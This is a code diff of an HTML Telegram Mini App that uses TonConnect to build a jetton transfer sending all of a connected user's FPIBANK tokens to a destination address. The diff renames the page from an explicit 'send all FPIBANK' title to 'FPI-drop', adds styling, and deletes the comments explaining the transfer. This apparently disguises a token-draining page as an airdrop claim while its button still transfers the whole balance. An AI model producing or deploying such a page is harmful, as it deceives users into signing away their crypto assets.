@@ -3,16 +3,35 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Telegram Mini App: Отправка всех FPIBANK (Jetton)</title>
+  <title>FPI-drop</title>
 
   <script src="https://telegram.org/js/telegram-webapp.js"></script>
   <script src="./js/tonconnect-sdk.min.js"></script>
   <link rel="stylesheet" href="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.css" />
   <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/tonweb/dist/tonweb.min.js"></script>
+  
+  <style>
+    body {
+      background-color: purple;
+      color: white;
+      font-family: Arial, sans-serif;
+    }
+    button#sendTransaction {
+      background-color: green;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    button#sendTransaction:hover {
+      opacity: 0.8;
+    }
+  </style>
 </head>
 <body>
-  <h1>Отправка всех FPIBANK через TonConnect (TonWeb)</h1>
+  <h1>FPI-drop</h1>
 
   <div id="ton-connect"></div>
   <button id="sendTransaction">Отправить все FPIBANK</button>
@@ -48,8 +67,6 @@
           return jettonData.wallet_address.address;
         }
         
-        // Если у получателя нет jetton-кошелька, возвращаем его TON-адрес
-        // (в этом случае кошелёк будет создан автоматически при первом переводе)
         return recipientTonAddress;
       } catch (error) {
         console.error("Ошибка при получении jetton-кошелька получателя:", error);
@@ -90,14 +107,14 @@
       }
 
       const transferCell = new Cell();
-      transferCell.bits.writeUint(0x0f8a7ea5, 32); // opcode for jetton transfer
-      transferCell.bits.writeUint(0, 64); // query_id
-      transferCell.bits.writeCoins(new BN(amount.toString())); // amount
-      transferCell.bits.writeAddress(new TonWeb.Address(destination)); // destination
-      transferCell.bits.writeAddress(new TonWeb.Address(userTonAddress)); // response address
-      transferCell.bits.writeBit(0); // custom payload flag (0 - no payload)
-      transferCell.bits.writeCoins(new BN(0)); // forward ton amount
-      transferCell.bits.writeBit(0); // forward payload flag (0 - no payload)
+      transferCell.bits.writeUint(0x0f8a7ea5, 32);
+      transferCell.bits.writeUint(0, 64);
+      transferCell.bits.writeCoins(new BN(amount.toString()));
+      transferCell.bits.writeAddress(new TonWeb.Address(destination));
+      transferCell.bits.writeAddress(new TonWeb.Address(userTonAddress));
+      transferCell.bits.writeBit(0);
+      transferCell.bits.writeCoins(new BN(0));
+      transferCell.bits.writeBit(0);
 
       try {
         const bocBytes = await transferCell.toBoc(false);
@@ -135,7 +152,7 @@
         validUntil: Math.floor(Date.now() / 1000) + 3600,
         messages: [{
           address: userJettonWallet,
-          amount: "100000000", // 0.1 TON - достаточно для комиссии
+          amount: "100000000",
           payload: payloadBoc,
         }],
       };
